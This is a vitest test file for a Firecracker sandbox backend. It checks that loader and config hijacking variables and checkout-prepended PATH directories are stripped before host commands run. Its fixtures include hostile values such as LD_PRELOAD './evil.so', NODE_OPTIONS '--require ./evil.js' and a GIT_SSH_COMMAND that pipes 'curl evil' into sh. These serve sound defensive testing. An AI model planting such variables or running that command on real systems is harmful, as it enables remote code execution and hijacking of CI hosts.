import { afterEach, describe, expect, it } from 'vitest';
import { mkdirSync, mkdtempSync, rmSync } from 'node:fs';
import { tmpdir } from 'node:os';
import { delimiter, join } from 'node:path';

import { createFirecrackerBackend } from '../../../src/action/backend/firecracker.js';
import { BackendUnavailableError } from '../../../src/action/backend/types.js';
import type { BackendContext } from '../../../src/action/backend/types.js';
import type { FirecrackerBackendDeps } from '../../../src/action/backend/firecracker.js';
import type { OverlayInput } from '../../../src/action/firecracker/overlay.js';

// The Firecracker backend reaches a set of BARE-NAME host spawns BEFORE the audit
// trust gate (the `ip` tap0 availability probe here, the overlay
// cp/mkfs.ext4/command-v disk-build spawns, and the launch.ts tap-setup `ip`
// spawns).  These tests pin that the SAME `stripDangerousEnv` policy used by the
// host install (and the bare backend) is applied to the env threaded into those
// spawns — a checkout-prepended PATH dir is dropped and an inherited
// loader/config selector (NODE_OPTIONS / LD_PRELOAD / …) is stripped.  Mirrors
// test/action/backend/bare.test.ts.

const savedWorkspace = process.env['GITHUB_WORKSPACE'];

afterEach(() => {
  if (savedWorkspace === undefined) delete process.env['GITHUB_WORKSPACE'];
  else process.env['GITHUB_WORKSPACE'] = savedWorkspace;
});

/** Base deps so each test only overrides what it cares about. */
function baseDeps(overrides: Partial<FirecrackerBackendDeps>): FirecrackerBackendDeps {
  return {
    // true ⇒ maybeClearCache is a no-op (no rmSync on the fake imagesDir).
    cacheFirecracker: true,
    warn: () => {},
    ...overrides,
  };
}

describe('createFirecrackerBackend — pre-trust host spawns use the sanitized env', () => {
  it('strips dangerous selectors + drops checkout PATH dirs from the `ip` probe env', async () => {
    // A real checkout dir so realpath-based containment resolves (mac /tmp symlink).
    const checkout = mkdtempSync(join(tmpdir(), 'sj-fc-probe-'));
    const checkoutBin = join(checkout, 'bin');
    mkdirSync(checkoutBin);
    // `checkoutRoots()` (inside stripDangerousEnv) reads the REAL process env, so
    // the workflow checkout must be visible there for its bin dir to be dropped.
    process.env['GITHUB_WORKSPACE'] = checkout;

    let probeCmd: string | undefined;
    let probeEnv: NodeJS.ProcessEnv | undefined;

    const backend = createFirecrackerBackend(
      baseDeps({
        platform: 'linux',
        // /dev/kvm present so the probe (the next gate) is the one we capture.
        existsSync: () => true,
        env: {
          GITHUB_WORKSPACE: checkout,
          // checkout-controlled dir prepended ahead of the system dirs
          PATH: `${checkoutBin}${delimiter}/usr/sbin${delimiter}/sbin`,
          // dangerous loader / config selectors that must never reach a host exec
          NODE_OPTIONS: '--require ./evil.js',
          LD_PRELOAD: './evil.so',
          LD_AUDIT: './audit.so',
          GIT_SSH_COMMAND: 'sh -c "curl evil|sh"',
          NPM_CONFIG_SCRIPT_SHELL: './evil.sh',
          // legit env that MUST survive
          HOME: '/home/runner',
          HTTPS_PROXY: 'http://proxy:8080',
        },
        commandSucceeds: (cmd, _args, opts) => {
          probeCmd = cmd;
          probeEnv = opts?.env;
          // Fail the probe so run() short-circuits before any VM work.
          return false;
        },
      }),
    );

    await expect(backend.run({} as BackendContext)).rejects.toBeInstanceOf(
      BackendUnavailableError,
    );

    expect(probeCmd).toBe('ip');
    expect(probeEnv).toBeDefined();
    const env = probeEnv as NodeJS.ProcessEnv;

    // dangerous selectors dropped
    expect(env['NODE_OPTIONS']).toBeUndefined();
    expect(env['LD_PRELOAD']).toBeUndefined();
    expect(env['LD_AUDIT']).toBeUndefined();
    expect(env['GIT_SSH_COMMAND']).toBeUndefined();
    expect(env['NPM_CONFIG_SCRIPT_SHELL']).toBeUndefined();

    // PATH: checkout dir dropped, system dirs kept in order
    expect(env['PATH']).toBe(`/usr/sbin${delimiter}/sbin`);

    // legit env preserved
    expect(env['HOME']).toBe('/home/runner');
    expect(env['HTTPS_PROXY']).toBe('http://proxy:8080');

    rmSync(checkout, { recursive: true, force: true });
  });

  it('threads the SAME sanitized env into makeOverlay (cp/mkfs.ext4 disk-build spawns)', async () => {
    const checkout = mkdtempSync(join(tmpdir(), 'sj-fc-overlay-'));
    const checkoutBin = join(checkout, 'bin');
    mkdirSync(checkoutBin);
    process.env['GITHUB_WORKSPACE'] = checkout;

    let overlayEnv: NodeJS.ProcessEnv | undefined;

    const backend = createFirecrackerBackend(
      baseDeps({
        // skipAvailabilityCheck bypasses the platform/kvm/ip gate so we reach
        // makeOverlay directly; selfTest skips the network pre-fetch.
        skipAvailabilityCheck: true,
        env: {
          GITHUB_WORKSPACE: checkout,
          PATH: `${checkoutBin}${delimiter}/usr/bin${delimiter}/bin`,
          NODE_OPTIONS: '--require ./evil.js',
          LD_PRELOAD: './evil.so',
          COREPACK_HOME: `${checkoutBin}/corepack`,
          HOME: '/home/runner',
        },
        // ensureBinaries is awaited before makeOverlay — stub it to a no-op shape.
        ensureBinaries: (async () => ({
          firecrackerPath: '/usr/bin/firecracker',
          vmlinuxPath: '/images/vmlinux',
        })) as unknown as NonNullable<FirecrackerBackendDeps['ensureBinaries']>,
        // Capture the env makeOverlay receives, then throw to end the run before
        // any VM launch (we only care about the env threading here).
        makeOverlay: (async (input: OverlayInput) => {
          overlayEnv = input.env;
          throw new Error('stop-after-overlay');
        }) as unknown as NonNullable<FirecrackerBackendDeps['makeOverlay']>,
      }),
    );

    await expect(
      backend.run({
        imagesDir: '/images',
        runnerImage: 'ubuntu-24.04',
        arch: 'x64',
        repoDir: '/work/repo',
        configPath: '/work/.script-jail.yml',
        extraRepoOverlayFiles: [],
        selfTest: true,
      } as unknown as BackendContext),
    ).rejects.toThrow('stop-after-overlay');

    expect(overlayEnv).toBeDefined();
    const env = overlayEnv as NodeJS.ProcessEnv;

    // dangerous selectors dropped
    expect(env['NODE_OPTIONS']).toBeUndefined();
    expect(env['LD_PRELOAD']).toBeUndefined();
    expect(env['COREPACK_HOME']).toBeUndefined();

    // PATH: checkout bin dropped, system dirs preserved in order
    expect(env['PATH']).toBe(`/usr/bin${delimiter}/bin`);
    expect(env['HOME']).toBe('/home/runner');

    rmSync(checkout, { recursive: true, force: true });
  });

  it('threads the SAME sanitized env into launchVm (tap-setup `ip` spawns)', async () => {
    const checkout = mkdtempSync(join(tmpdir(), 'sj-fc-launch-'));
    const checkoutBin = join(checkout, 'bin');
    mkdirSync(checkoutBin);
    process.env['GITHUB_WORKSPACE'] = checkout;

    let launchEnv: NodeJS.ProcessEnv | undefined;

    const backend = createFirecrackerBackend(
      baseDeps({
        skipAvailabilityCheck: true,
        env: {
          GITHUB_WORKSPACE: checkout,
          PATH: `${checkoutBin}${delimiter}/usr/sbin${delimiter}/sbin`,
          NODE_OPTIONS: '--require ./evil.js',
          LD_LIBRARY_PATH: checkoutBin,
          HOME: '/home/runner',
        },
        ensureBinaries: (async () => ({
          firecrackerPath: '/usr/bin/firecracker',
          vmlinuxPath: '/images/vmlinux',
        })) as unknown as NonNullable<FirecrackerBackendDeps['ensureBinaries']>,
        // makeOverlay must succeed so the run reaches launchVm.  Return a fake
        // OverlayResult shape with a no-op cleanup.
        makeOverlay: (async () => ({
          rootfsCopyPath: '/run/rootfs.ext4',
          repoDiskPath: '/run/repo.ext4',
          scratchDiskPath: '/run/scratch.ext4',
          sjtmpDiskPath: '/run/sjtmp.ext4',
          workDir: '/run',
          cleanup: async () => {},
        })) as unknown as NonNullable<FirecrackerBackendDeps['makeOverlay']>,
        // Capture the env launchVm receives, then throw to end the run.
        launchVm: (async (input: { env?: NodeJS.ProcessEnv }) => {
          launchEnv = input.env;
          throw new Error('stop-after-launch');
        }) as unknown as NonNullable<FirecrackerBackendDeps['launchVm']>,
      }),
    );

    await expect(
      backend.run({
        imagesDir: '/images',
        runnerImage: 'ubuntu-24.04',
        arch: 'x64',
        repoDir: '/work/repo',
        configPath: '/work/.script-jail.yml',
        extraRepoOverlayFiles: [],
        selfTest: true,
      } as unknown as BackendContext),
    ).rejects.toThrow('stop-after-launch');

    expect(launchEnv).toBeDefined();
    const env = launchEnv as NodeJS.ProcessEnv;

    expect(env['NODE_OPTIONS']).toBeUndefined();
    expect(env['LD_LIBRARY_PATH']).toBeUndefined();
    expect(env['PATH']).toBe(`/usr/sbin${delimiter}/sbin`);
    expect(env['HOME']).toBe('/home/runner');

    rmSync(checkout, { recursive: true, force: true });
  });
});
